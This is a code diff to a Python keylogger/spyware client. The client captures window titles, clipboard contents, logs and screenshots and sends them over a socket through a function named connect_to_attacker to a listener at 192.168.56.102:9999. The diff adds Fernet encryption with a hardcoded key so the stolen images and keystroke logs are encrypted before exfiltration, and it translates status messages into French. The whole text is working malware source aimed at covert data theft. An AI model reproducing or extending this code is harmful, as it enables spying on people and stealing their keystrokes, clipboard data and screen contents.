@@ -14,16 +14,17 @@ import pyperclip
 import threading
 import socket
 import io
-import random
+from cryptography.fernet import Fernet
 
 current_window = ""
 log_data = {}
 previous_clipboard = ""
-
+KEY = b'fwFi-YG7gxGvBzeN8UBcyQ5_Vmhwcf0V4FGBKFcHqPI='
+fernet = Fernet(KEY)
 sock = None
+
 try:
     import win32gui
-    import win32clipboard
     WIN32_AVAILABLE = True
 except ImportError:
     print("Warning: pywin32 not found. Some features (window title, clipboard) disabled.")
@@ -46,37 +47,27 @@ def connect_to_attacker(ip, port):
 def envoyer_image(img_data, filename):
     global sock
     if sock is None:
-        print("[-] No connection, image not sent")
+        print("[-] Pas connecté, image non envoyée.")
         return
-    
+
     try:
-        # Send header with newline
-        header = f"IMAGE|{filename}|{len(img_data)}\n".encode('utf-8')
-        sock.sendall(header)
-        print(f"[📸] Sent header for {filename} ({len(img_data)} bytes)")
-        
-        # Send image data in chunks
-        total_sent = 0
-        chunk_size = 4096
-        while total_sent < len(img_data):
-            chunk = img_data[total_sent:total_sent+chunk_size]
-            sent = sock.send(chunk)
-            if sent == 0:
-                raise RuntimeError("Socket connection broken")
-            total_sent += sent
-            print(f"[📸] Sent {total_sent}/{len(img_data)} bytes")
-            
-        print(f"[✅] Successfully sent {filename}")
+        encrypted_img = fernet.encrypt(img_data)
+        header = f"IMAGE|{filename}|{len(encrypted_img)}".encode()
+        sock.sendall(header + b"\n")
+        sock.sendall(encrypted_img)
+        print(f"[+] Image chiffrée envoyée : {filename}")
     except Exception as e:
-        print(f"[❌] Error sending image: {e}")
+        print(f"Erreur envoi image : {e}")
         # Attempt to reconnect
         connect_to_attacker("192.168.56.102", 9999)
+
 def envoyer_log(message):
     global sock
     if sock is None:
         return
     try:
-        data = f"LOG|{message}".encode()
+        encrypted = fernet.encrypt(message.encode())
+        data = b"LOG|" + encrypted
         sock.sendall(data + b"\n")
     except Exception as e:
         print(f"Erreur envoi log : {e}")
